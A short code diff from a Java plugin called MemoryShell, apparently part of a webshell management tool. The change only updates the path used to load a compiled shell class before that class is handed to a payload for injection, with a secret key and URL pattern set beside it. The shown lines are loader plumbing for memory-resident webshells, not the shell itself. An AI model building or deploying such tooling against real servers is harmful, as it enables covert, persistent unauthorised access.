@@ -90,7 +90,7 @@ public class MemoryShell implements Plugin {
             reqParameter.add("secretKey", secretKey);
             reqParameter.add("path", pattern);
             String className = String.format("x.%s", shellName);
-            InputStream inputStream = getClass().getResourceAsStream(String.format("assets/%s.classs", shellName));
+            InputStream inputStream = getClass().getClassLoader().getResourceAsStream(String.format("shell/java/assets/%s.classs", shellName));
             byte[] classByteArray = functions.readInputStream(inputStream);
             inputStream.close();
             if (this.payload.include(className, classByteArray)) {
